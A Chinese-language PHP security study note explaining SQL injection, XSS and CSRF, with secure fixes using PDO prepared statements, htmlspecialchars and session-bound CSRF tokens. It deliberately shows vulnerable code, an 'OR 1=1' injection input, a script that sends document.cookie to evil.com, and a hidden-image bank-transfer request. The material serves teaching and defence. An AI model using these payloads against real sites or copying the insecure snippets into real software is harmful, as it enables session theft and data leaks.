# PHP Web 開發中常見的安全漏洞有哪些？(SQLi, XSS, CSRF) 如何防範？

- **難度**: 7
- **重要程度**: 5
- **標籤**: `PHP`, `Security`, `SQLi`, `XSS`, `CSRF`

## 問題詳述

Web 安全是後端開發的重中之重。PHP 作為廣泛使用的 Web 開發語言，其應用程式經常成為攻擊目標。請解釋三種最常見的 Web 安全漏洞：SQL 注入 (SQL Injection)、跨站腳本攻擊 (Cross-Site Scripting, XSS) 和跨站請求偽造 (Cross-Site Request Forgery, CSRF)。並針對每種漏洞，說明其攻擊原理以及在 PHP 中最有效的防範措施。

## 核心理論與詳解

### 1. SQL 注入 (SQL Injection, SQLi)

#### SQLi 攻擊原理

SQL 注入發生在當應用程式將來自使用者的不可信輸入 **直接拼接** 到 SQL 查詢語句中時。攻擊者可以通過構造惡意的輸入，欺騙資料庫執行非預期的 SQL 命令，從而竊取、修改或刪除資料，甚至獲得資料庫伺服器的控制權。

**範例 (不安全的程式碼)**:

```php
<?php
// 假設從 URL 獲取用戶 ID
$userId = $_GET['id'];

// 直接將用戶輸入拼接到 SQL 查詢中，這是極其危險的！
$sql = "SELECT * FROM users WHERE id = $userId";

$result = $mysqli->query($sql);
// ...
?>
```

如果一個正常用戶訪問 `user.php?id=123`，SQL 查詢會是 `SELECT * FROM users WHERE id = 123`。
但如果攻擊者構造一個惡意輸入 `user.php?id=123 OR 1=1`，SQL 查詢就會變成：

```sql
SELECT * FROM users WHERE id = 123 OR 1=1
```

`OR 1=1` 永遠為真，這將導致查詢返回 `users` 表中的 **所有** 用戶資料，造成嚴重的資料洩露。更複雜的攻擊甚至可以執行 `DROP TABLE` 或寫入檔案。

#### 防範措施：預備語句 (Prepared Statements)

防範 SQL 注入的 **黃金法則** 是：**永遠不要信任用戶輸入，永遠不要手動拼接 SQL 查詢**。

最有效的防範方法是使用 **預備語句 (Prepared Statements)** 和 **參數化查詢 (Parameterized Queries)**。

**原理**:
預備語句將 SQL 查詢的 **結構** 和 **資料** 分開處理。

- **準備 (Prepare)**: 先將包含佔位符 (如 `?` 或 `:name`) 的 SQL 查詢結構發送到資料庫進行編譯和解析。
- **綁定 (Bind)**: 然後將用戶輸入作為參數綁定到這些佔位符上。
- **執行 (Execute)**: 最後執行查詢。

在整個過程中，用戶輸入永遠只被當作 **資料** 處理，而絕不會被當作 SQL 語法的一部分來執行，從而從根本上杜絕了 SQL 注入的可能。

**範例 (使用 PDO)**:

```php
<?php
$userId = $_GET['id'];

// 1. 準備帶有佔位符的 SQL 語句
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");

// 2. 綁定參數
$stmt->bindParam(':id', $userId, PDO::PARAM_INT);

// 3. 執行
$stmt->execute();

$user = $stmt->fetch();
?>
```

### 2. 跨站腳本攻擊 (Cross-Site Scripting, XSS)

#### XSS 攻擊原理

XSS 攻擊發生在當應用程式將來自使用者的不可信輸入 **未經處理地直接輸出** 到 HTML 頁面中時。攻擊者可以注入惡意的 HTML 或 JavaScript 腳本，這些腳本將在其他用戶的瀏覽器中執行，從而竊取用戶的 Cookie、Session、發起惡意請求或篡改頁面內容。

**範例 (不安全的程式碼)**:

```php
<?php
// 從用戶評論中獲取內容
$comment = $_POST['comment'];

// 未經處理，直接輸出到頁面
echo "<div>" . $comment . "</div>";
?>
```

如果一個正常用戶提交的評論是 `Hello, world!`，頁面會正常顯示。
但如果攻擊者提交的評論是惡意腳本：

```html
<script>document.location='http://evil.com/steal_cookie.php?cookie=' + document.cookie;</script>
```

當其他用戶瀏覽這個頁面時，這段腳本將在他們的瀏覽器中執行，並將他們的 Cookie 發送到攻擊者的伺服器。

#### 防範措施：輸出編碼 (Output Encoding)

防範 XSS 的核心原則是：**對所有來自用戶的、將要輸出到 HTML 的內容進行適當的編碼 (Encoding)**。

在 PHP 中，最簡單有效的方法是使用 `htmlspecialchars()` 函式。

**原理**:
`htmlspecialchars()` 會將在 HTML 中有特殊意義的字元轉換為它們的 HTML 實體表示。

- `&` 轉換為 `&amp;`
- `"` 轉換為 `&quot;`
- `'` 轉換為 `&#039;`
- `<` 轉換為 `&lt;`
- `>` 轉換為 `&gt;`

這樣一來，即使用戶輸入了 `<script>` 標籤，它在 HTML 原始碼中會變成 `&lt;script&gt;`，瀏覽器只會將其作為純文字顯示出來，而不會執行它。

**範例 (安全的程式碼)**:

```php
<?php
$comment = $_POST['comment'];

// 在輸出前進行 HTML 編碼
echo "<div>" . htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') . "</div>";
?>
```

**最佳實踐**: 在現代模板引擎（如 Twig, Blade）中，預設都會對輸出進行自動編碼，這是更推薦的做法。

### 3. 跨站請求偽造 (Cross-Site Request Forgery, CSRF)

#### CSRF 攻擊原理

CSRF 是一種欺騙用戶在他們已經登入的網站上執行非預期操作的攻擊。攻擊者在一個惡意網站上放置一個連結或表單，該連結指向受信任網站的一個操作（如修改密碼、發送訊息）。當受害者在已登入受信任網站的情況下，點擊了這個惡意連結，瀏覽器會自動攜帶受害者的 Cookie 向受信任網站發起請求，導致該操作在受害者不知情的情況下被執行。

**攻擊流程**:

- 受害者登入 `bank.com`，瀏覽器保存了 `bank.com` 的登入 Session Cookie。
- 受害者被誘導訪問了攻擊者的網站 `evil.com`。
- `evil.com` 的頁面中可能包含一個看不見的圖片或表單，其 `src` 或 `action` 指向 `bank.com` 的轉帳操作，例如：
    `<img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none;">`
- 受害者的瀏覽器會自動向 `bank.com` 發起這個 GET 請求，並 **自動攜帶 `bank.com` 的 Cookie**。
- `bank.com` 的伺服器驗證 Cookie，認為是受害者本人發起的合法請求，於是轉帳操作被成功執行。

#### 防範措施：同步權杖模式 (Synchronizer Token Pattern)

防範 CSRF 的標準方法是使用 **CSRF Token**。

**原理**:

- 當用戶訪問一個需要保護的表單頁面時，伺服器生成一個隨機的、唯一的、與用戶 Session 綁定的權杖 (Token)。
- 伺服器將這個 Token 嵌入到表單的一個隱藏欄位中。
- 當用戶提交表單時，這個 Token 會隨表單一起被發送回伺服器。
- 伺服器在處理請求前，會比較用戶 Session 中儲存的 Token 和表單提交過來的 Token 是否一致。
  - 如果一致，說明請求是合法的，處理該請求。
  - 如果不一致或 Token 不存在，說明請求可能是偽造的，拒絕該請求。

因為攻擊者無法獲取到用戶 Session 中的 Token，所以他們無法構造出帶有正確 Token 的惡意請求，從而有效阻止了 CSRF 攻擊。

**範例 (簡化)**:

```php
<?php
session_start();

// 在顯示表單時
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // 1. 生成並儲存 Token
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));

    // 2. 在表單中嵌入 Token
    echo '<form action="/update-profile" method="post">
              <input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">
              ...
          </form>';
}

// 在處理表單提交時
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 4. 驗證 Token
    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        die('CSRF token validation failed.');
    }
    
    // Token 驗證通過，處理請求
    // ...
    
    // 處理完後銷毀 Token
    unset($_SESSION['csrf_token']);
}
?>
```

**注意**: `hash_equals()` 函式用於比較字串，可以防止時序攻擊 (Timing Attack)，比直接使用 `==` 更安全。現代框架通常都內建了 CSRF 保護中介軟體，自動處理 Token 的生成和驗證。
